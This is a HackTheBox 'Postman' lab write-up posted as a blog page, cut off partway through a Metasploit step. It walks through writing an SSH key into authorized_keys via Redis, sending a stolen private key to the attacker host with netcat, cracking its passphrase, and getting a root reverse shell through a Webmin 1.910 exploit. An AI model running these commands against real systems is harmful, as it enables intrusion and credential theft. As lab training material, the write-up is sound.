<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Postman" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a network enumeration, discovering a vulnerable service redis 4.0.9 that is susceptible to a RCE exploit, through the service, we are able to write a SSH public key into user redis’s authorized_keys, allowing us to SSH into user redis." /><meta property="og:description" content="Overview This machine begins w/ a network enumeration, discovering a vulnerable service redis 4.0.9 that is susceptible to a RCE exploit, through the service, we are able to write a SSH public key into user redis’s authorized_keys, allowing us to SSH into user redis." /><link rel="canonical" href="https://yufongg.github.io/posts/Postman/" /><meta property="og:url" content="https://yufongg.github.io/posts/Postman/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-22T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Postman" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-09-22T00:00:00+08:00","description":"Overview This machine begins w/ a network enumeration, discovering a vulnerable service redis 4.0.9 that is susceptible to a RCE exploit, through the service, we are able to write a SSH public key into user redis’s authorized_keys, allowing us to SSH into user redis.","headline":"HackTheBox - Postman","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Postman/"},"url":"https://yufongg.github.io/posts/Postman/"}</script><title>HackTheBox - Postman | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Postman</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Postman/images/Pasted%20image%2020220922031233.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Postman</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1663776000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-22 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2086 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a network enumeration, discovering a vulnerable service <code class="language-plaintext highlighter-rouge">redis 4.0.9</code> that is susceptible to a RCE exploit, through the service, we are able to write a SSH public key into user <code class="language-plaintext highlighter-rouge">redis</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code>, allowing us to SSH into user <code class="language-plaintext highlighter-rouge">redis</code>.</p><p>For the privilege escalation part, we have to first privilege escalate to user <code class="language-plaintext highlighter-rouge">Matt</code> and then to <code class="language-plaintext highlighter-rouge">root</code>. After enumerating the system w/ <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, <code class="language-plaintext highlighter-rouge">Matt</code>’s encrypted SSH private key is enumerated, after bruteforcing it w/ <code class="language-plaintext highlighter-rouge">john</code>, we are able to privilege escalate to <code class="language-plaintext highlighter-rouge">Matt</code> w/ <code class="language-plaintext highlighter-rouge">su</code> by specifying the passphrase of <code class="language-plaintext highlighter-rouge">Matt</code>’s private key.</p><p>With <code class="language-plaintext highlighter-rouge">Matt</code>’s credentials, we are also able to login to <code class="language-plaintext highlighter-rouge">MiniServ/Webmin 1.91</code> on port 10000, where it is susceptible to an authenticated RCE exploit due to vulnerabilities residing in Update Package, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code>.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Postman<tr><td>IP<td>10.10.10.160<tr><td>Points<td>20<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/114053">TheCyberGeek</a><tr><td>Release Date<td>02 Nov 2019</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>  200      GET       91l      253w     3844c http://10.10.10.160/
  403      GET       11l       32w      292c http://10.10.10.160/.html
  403      GET       11l       32w      291c http://10.10.10.160/.php
  301      GET        9l       28w      310c http://10.10.10.160/css <span class="o">=&gt;</span> http://10.10.10.160/css/
  301      GET        9l       28w      312c http://10.10.10.160/fonts <span class="o">=&gt;</span> http://10.10.10.160/fonts/
  301      GET        9l       28w      313c http://10.10.10.160/images <span class="o">=&gt;</span> http://10.10.10.160/images/
  301      GET        9l       28w      309c http://10.10.10.160/js <span class="o">=&gt;</span> http://10.10.10.160/js/
  403      GET       11l       32w      300c http://10.10.10.160/server-status
  301      GET        9l       28w      313c http://10.10.10.160/upload <span class="o">=&gt;</span> http://10.10.10.160/upload/
</pre></table></code></div></div></ul><h2 id="tcp10000-http">TCP/10000 (HTTP) <a href="#tcp10000-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>NMAP<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  PORT      STATE SERVICE REASON         VERSION
  10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 <span class="o">(</span>Webmin httpd<span class="o">)</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">MiniServ 1.910</code></ul></ul><h2 id="tcp6379-redis">TCP/6379 (Redis) <a href="#tcp6379-redis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>NMAP<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  PORT     STATE SERVICE REASON         VERSION
  6379/tcp open  redis   syn-ack ttl 63 Redis key-value store 4.0.9 <span class="o">(</span>64 bits<span class="o">)</span>
  |_redis-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">Redis key-value store 4.0.9</code></ul></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp10000-http---webminminiserv-1910-login">TCP/10000 (HTTP) - Webmin/MiniServ 1.910 Login <a href="#tcp10000-http---webminminiserv-1910-login" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found <code class="language-plaintext highlighter-rouge">Webmin/MiniServ</code> login page <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Postman/images/Pasted%20image%2020220921155828.png" alt="" data-proofer-ignore><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">Webmin 1.910</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Webmin 1.910 - ‘Package Updates’ Remote Command Execution (Metasploit)<td>linux/remote/46984.rb<tr><td>Webmin 1.910 - Remote Code Execution Using Python Script<td>https://github.com/roughiz/Webmin-1.910-Exploit-Script</table></div><li>Tried <a href="https://yufongg.github.io/posts/Shellshock-via-cgi-bin/">Shellshock</a>, failed <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Postman/images/Pasted%20image%2020220921155556.png" alt="" data-proofer-ignore><li>Lets move on.</ol><h2 id="tcp6379-redis-key-value-store-409---rce-via-ssh-public-key-write">TCP/6379 (Redis key-value store 4.0.9) - RCE via SSH public key write <a href="#tcp6379-redis-key-value-store-409---rce-via-ssh-public-key-write" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">Redis key-value store 4.0.9</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Redis - Replication Code Execution (Metasploit)<td>linux/remote/48272.rb<tr><td>Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)<td>linux/remote/47195.rb<tr><td>Redis Remote Command Execution (SSH)<td>https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html<tr><td>Redis Remote Code Execution<td>https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce</table></div><li>Tried the 2 metasploit exploits, both failed<li>Instead I refered to <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce"><code class="language-plaintext highlighter-rouge">hacktricks - Pentesting Redis</code></a>, there is an entire section on how to do RCE.<ol><li>Redis RCE via <code class="language-plaintext highlighter-rouge">PHP</code> Webshell - Failed, insufficient permissions to write to <code class="language-plaintext highlighter-rouge">/var/www/html/</code><li>Redis RCE via SSH - Works!</ol><li>Why is <code class="language-plaintext highlighter-rouge">redis</code> vulnerable to this?<ul><li>99.99% of the Redis use cases are inside a sandboxed environment. Security is complex. Adding security features adds complexity. Complexity for 0.01% of use cases is not great, but it is a matter of design philosophy, so you may disagree of course. - <a href="https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html">Source</a><li>Redis should only be accessed by authorized clients and there should be fire walling, authentication should be enabled and, binding it to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>.</ul><li>Try <code class="language-plaintext highlighter-rouge">Redis RCE via SSH</code><ol><li>Find out the home directory of the <code class="language-plaintext highlighter-rouge">redis</code> user<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> 10.10.10.160:6379&gt; config get dir
 1) "dir"
 2) "/var/lib/redis"
 10.10.10.160:6379&gt; 
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/var/lib/redis</code></ul><li>Create SSH key-pair<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# ssh-keygen -t rsa -C "crack@redis.io"
 Generating public/private rsa key pair.
 Enter file in which to save the key (/root/.ssh/id_rsa): ./id_rsa
 Enter passphrase (empty for no passphrase): 
 Enter same passphrase again: 
 Your identification has been saved in ./id_rsa
 Your public key has been saved in ./id_rsa.pub
 The key fingerprint is:
 SHA256:lNzv29nGWGzcI4CzBj/TXSuaTJ4oZBFrJ6//P+3nrBs crack@redis.io
 The key's randomart image is:
 +---[RSA 3072]----+
 |                 |
 |       o o       |
 |        * o      |
 |       B + o   . |
 |      . S + + .oo|
 |       o B + + o*|
 |      o o B = E=.|
 |       o . * +.*+|
 |        o...o.B*=|
 +----[SHA256]-----+
</pre></table></code></div></div><li>Create <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> w/ padding - this is to ensure that the key remains valid<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt
</pre></table></code></div></div><li>Remove all keys in database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# redis-cli -h 10.10.10.160 flushall
 OK
</pre></table></code></div></div><li>Save created public key to user <code class="language-plaintext highlighter-rouge">redis</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
 OK

 ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# redis-cli -h 10.10.10.160
 10.10.10.160:6379&gt; config set dir /var/lib/redis/.ssh/
 OK
 10.10.10.160:6379&gt; config set dbfilename "authorized_keys"
 OK
 10.10.10.160:6379&gt; save
 OK
 10.10.10.160:6379&gt; 
</pre></table></code></div></div></ol><li>SSH w/ <code class="language-plaintext highlighter-rouge">redis -i id_rsa</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# ssh -i id_rsa redis@postman.htb
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
	
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
	
	
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
 Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
 redis@Postman:~$ 
</pre></table></code></div></div><li>Demo - <code class="language-plaintext highlighter-rouge">redis RCE via SSH</code><div style="width:100%;height:0px;position:relative;padding-bottom:102.279%;"><iframe src="https://streamable.com/e/qg6kpc" frameborder="0" width="100%" height="100%" allowfullscreen="" style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;"></iframe></div></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="matt---enumeration-found-ssh-private-key">Matt - Enumeration (Found SSH Private Key) <a href="#matt---enumeration-found-ssh-private-key" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found <code class="language-plaintext highlighter-rouge">matt</code>’s SSH private key w/ <code class="language-plaintext highlighter-rouge">linpeas.sh</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Postman/images/Pasted%20image%2020220921231303.png" alt="" data-proofer-ignore><li>Transfer <code class="language-plaintext highlighter-rouge">id_rsa</code> to <code class="language-plaintext highlighter-rouge">kali</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# nc -nvlp 4444 &gt; matt_id_rsa
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.10.160.
 Ncat: Connection from 10.10.10.160:53146.
	
 redis@Postman:/tmp$ nc 10.10.14.14 4444 &lt; /opt/id_rsa.bak
</pre></table></code></div></div></ol><h2 id="matt---crack-ssh-private-key--ssh">Matt - Crack SSH Private Key &amp; SSH <a href="#matt---crack-ssh-private-key--ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Convert it to <code class="language-plaintext highlighter-rouge">john</code> format w/ <code class="language-plaintext highlighter-rouge">ssh2john.py</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# python ssh2john.py matt_id_rsa &gt; john_matt_id_rsa
</pre></table></code></div></div><li>Crack hash<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# john john_matt_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
 Cost 2 (iteration count) is 2 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 computer2008     (matt_id_rsa)     
 1g 0:00:00:00 DONE (2022-09-21 23:16) 4.000g/s 987264p/s 987264c/s 987264C/s comunista..comett
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
</pre></table></code></div></div><li>SSH - Failed<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# ssh Matt@postman.htb -i matt_id_rsa 
 Enter passphrase for key 'matt_id_rsa': 
 Connection closed by 10.10.10.160 port 22
</pre></table></code></div></div><ul><li>Connection closed immediately</ul><li>Instead, simply <code class="language-plaintext highlighter-rouge">su</code> to <code class="language-plaintext highlighter-rouge">Matt</code> w/ <code class="language-plaintext highlighter-rouge">computer2008</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> redis@Postman:/home/Matt$ su Matt
 Password: computer2008
 Matt@Postman:~$ 
</pre></table></code></div></div></ol><h2 id="root---enumeration">Root - Enumeration <a href="#root---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found some information from <code class="language-plaintext highlighter-rouge">.bash_history</code><ul><li>Based on the history, user <code class="language-plaintext highlighter-rouge">Matt</code> is used to create user <code class="language-plaintext highlighter-rouge">redis</code> &amp; some configurations in <code class="language-plaintext highlighter-rouge">root</code>.</ul><li>Successfully login w/ <code class="language-plaintext highlighter-rouge">Matt:computer2008</code> on <code class="language-plaintext highlighter-rouge">TCP/10000 (MiniServ 1.910)</code></ol><h2 id="root---webminminiserv-1910-authenticated-rce">Root - Webmin/MiniServ 1.910 Authenticated RCE <a href="#root---webminminiserv-1910-authenticated-rce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>How does <a href="https://github.com/roughiz/Webmin-1.910-Exploit-Script"><code class="language-plaintext highlighter-rouge">Webmin 1.910 - Remote Code Execution Using Python Script</code></a> work?<ol><li>There is a RCE vulnerability residing in <code class="language-plaintext highlighter-rouge">MiniServ</code>’s Package Updates module,<li>An authenticated remote attacker can exploit this if they are authorized to the Package Update module via the data parameter <code class="language-plaintext highlighter-rouge">update.cgi</code> to execute code w/ <code class="language-plaintext highlighter-rouge">root</code> privileges.</ol><li>Try <a href="https://github.com/roughiz/Webmin-1.910-Exploit-Script"><code class="language-plaintext highlighter-rouge">Webmin 1.910 - Remote Code Execution Using Python Script</code></a><ol><li>Start <code class="language-plaintext highlighter-rouge">netcat</code> listener<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
</pre></table></code></div></div><li>Exploit!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre> ┌──(webmin-1.9)(root💀kali)-[~/htb/postman/10.10.10.160/exploit/webmin-1.9]
 └─# python2 webmin_exploit.py -s true --rhost postman.htb --rport 10000 --lhost 10.10.14.14 --lport 4444 -u Matt -p computer2008 -t / 
		 
 ********************Webmin 1.910 Exploit By roughiz********************
		
 ********************Retrieve Cookies sid*******************************
		
		
 ********** [+] [Exploit] The Cookie is 748f1ae3b99cbab5753e2387d9f596c7
		
 ****************** Create payload and Exploit ******************
		
 ┌──(root💀kali)-[~/htb/postman]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.10.160.
 Ncat: Connection from 10.10.10.160:53152.
 id;whoami
 uid=0(root) gid=0(root) groups=0(root)
 root
</pre></table></code></div></div></ol><li>Demo - <code class="language-plaintext highlighter-rouge">MiniServ/Webmin 1.91 Authenticated RCE</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Postman/images/vmware_D6liDAQW8D.gif" alt="" data-proofer-ignore></ol><h2 id="root---webminminiserv-1910-authenticated-rce-metasploit">Root - Webmin/MiniServ 1.910 Authenticated RCE (Metasploit) <a href="#root---webminminiserv-1910-authenticated-rce-metasploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Launch <code class="language-plaintext highlighter-rouge">msfconsole</code><li>Set <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> msf6 exploit(linux/http/webmin_packageup_rce) &gt; set PASSWORD computer2008
 PASSWORD =&gt; computer2008
 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set RHOSTS postman.htb
 RHOSTS =&gt; postman.htb
 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set SSL true
